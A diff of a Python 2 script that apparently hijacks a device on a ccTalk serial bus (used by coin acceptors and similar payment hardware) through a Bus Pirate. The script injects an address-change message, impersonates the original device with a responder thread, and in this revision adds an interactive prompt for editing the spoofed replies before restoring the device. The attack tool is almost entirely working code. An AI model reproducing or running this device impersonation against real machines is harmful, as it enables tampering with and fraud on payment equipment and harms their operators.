@@ -26,25 +26,21 @@ class ccResponder(threading.Thread):
         """
         buff=""
         while True:
-            print "Buffer status"
-            print buff.encode('hex')
             #Read the destination address
             if len(buff)<2:
-                while ser.inWaiting()<2:
-                    time.sleep(0.001)
                 buff += ser.read(2)
             length=ord(buff[1])
             if len(buff)<length+5:
-                while ser.inWaiting()<length+3:
-                    time.sleep(0.001)
                 buff += ser.read(length+3)
             try:
                 ccPkt = ccTalkMessage(data=buff[:length+5])
-                print "Received : ", ccPkt
                 return ccPkt
             except:
                 buff=buff[1:]
                 continue
+
+    def getResponses(self):
+        return [(key, self.responses[key]) for key in self.responses] 
 
     def setResponse(self, header,response):
         """
@@ -66,20 +62,14 @@ class ccResponder(threading.Thread):
             resp = ccTalkMessage(header=0, source=self.address, destination=request.source, payload=self.responses[request.payload.header])
         else:
             resp = ccTalkMessage(header=0, source=self.address, destination=request.source)
-        print "Responding : ", resp
-        disableRX()
-        #ser.write(chr(0b00010000+(len(resp.raw())-1)))
         #ser.write(resp.raw())
         #ser.flush()
-        # Since the bitbang responds à 0x01 after each byte, clean after the whole data is sent
         #ser.read(len(resp.raw()))
         for byte in resp.raw():
-            ser.write(chr(0b00010001))
             ser.write(byte)
             ser.flush()
             ser.read(1)
-            print "Wrote ", byte.encode('hex')
-        enableRX()
+
     
     def run(self):
         global ser
@@ -139,20 +129,21 @@ def enterBitBang():
     # Enter bitbang mode
     for i in xrange(20):
         ser.write("\x00")
-        if ser.inWaiting()>4:
-            if "BBIO1" in ser.read(5):
-                break
-
+    if "BBIO1" not in ser.read(5):
+        sys.exit(0)
+        
     # Enter UART mode
     ser.write("\x03")
+    if "ART1" not in ser.read(4):
+        sys.exit(0)
     #Baud rate : 9600
     ser.write(chr(0b01100100))
+    ser.read(1)
     #Peripherals : power ON / pullup ON
     ser.write(chr(0b01001100))
-    # Cleans input buffer
-    ser.flushInput()
-    while ser.inWaiting()>0:
-        time.sleep(0.1)
+    ser.read(1)
+    ser.write(chr(0b00001111))
+    ser.read(1)
 
 
 def leaveBitBang():
@@ -163,21 +154,6 @@ def leaveBitBang():
     ser.write("\x00")
     # Leave bitbang mode
     ser.write("\x0f")
-
-def disableRX():
-    """
-    Disable UART RX echo on the bus pirate
-    """
-    ser.write(chr(0b00000011))
-    ser.read(1)
-
-def enableRX():
-    """
-    Enable UART RX echo on the bus pirate
-    """
-    ser.write(chr(0b00000010))
-    ser.read(1)
-
 
 
 def injectMessage(header, data='', source=1, destination=2):
@@ -193,13 +169,9 @@ def injectMessage(header, data='', source=1, destination=2):
         while bytesToRead == 0 and not sent:
             bytesToRead = ser.inWaiting()
             if time.clock()-start >= 0.01:
-                print "Start"
-                disableRX()
-                ser.write(chr(0b00010000+(len(request)-1)))
                 ser.write(request.raw())
                 ser.flush()
                 ser.read(len(request.raw()))
-                enableRX()
                 sent=True
                 break
         bytesToRead=0
@@ -231,7 +203,6 @@ if __name__ == '__main__':
                 #ser=serial.Serial(options.serPort, 115200, timeout=1)
                 ser=serial.Serial(options.serPort, 115200)
                 enterBitBang()
-                enableRX()
             else:
                 #ser=serial.Serial(options.serPort, 9600, timeout=1)
                 ser=serial.Serial(options.serPort, 9600)
@@ -273,8 +244,6 @@ if __name__ == '__main__':
                     responder.setResponse(ccPkts[i-1].payload.header, ccPkts[i].getPayload()[1:])
                     print "Added response to request header " + str(ccPkts[i-1].payload.header)
             
-            responder.setResponse(229, "112233445566778899aabb".decode('hex'))
-
             print "[*] Replacing device @ "+str(options.source)+" to "+str(options.destination)
 
             #print "[*] Checking for device to hijack"
@@ -287,21 +256,26 @@ if __name__ == '__main__':
 
 
             #Totally flush the input buffer before starting replies
-            disableRX()
             ser.flushInput()
             while ser.inWaiting()>0:
                 time.sleep(0.1)
             time.sleep(0.1)
-            enableRX()
 
             print "[*] Device successfully hijacked, starting responder thread"
             responder.start()
 
             while True:
-                #userHeader = int(raw_input('Enter header value to change (q to quit): '))
-                #userData = raw_input('Enter new data (in hex): ').decode('hex')
-                #responder.setResponse(userHeader,userData)
-                time.sleep(1)
+                #time.sleep(1)
+                print 'Enter header value to change (q to quit, l to list current values): '
+                userHeader = raw_input("Value : ")
+                if userHeader == 'l':
+                    for header, response in responder.getResponses():
+                        print header, " : ", response.encode('hex')
+                elif userHeader.isdigit():
+                    userData = raw_input('Enter new data (in hex): ').decode('hex')
+                    responder.setResponse(int(userHeader),userData)
+                elif userHeader == 'q':
+                    break
 
         else:
             print "[-] No time slots found"
@@ -310,14 +284,14 @@ if __name__ == '__main__':
     except Exception, e:
         print e
 
-    #except:
-    #    print "[*] Stopping responder thread"
-    #    responder.stop()
-    #    responder.join()
+    except:
+       print "" 
 
+    print "[*] Stopping responder thread"
+    responder.stop()
+    responder.join()
 
     print "[*] Restoring device @ " + str(options.source)
-    enableRX()
     injectMessage( header=251, data=chr(int(options.source)), source=1, destination=int(options.destination))
 
     if options.busPirate:
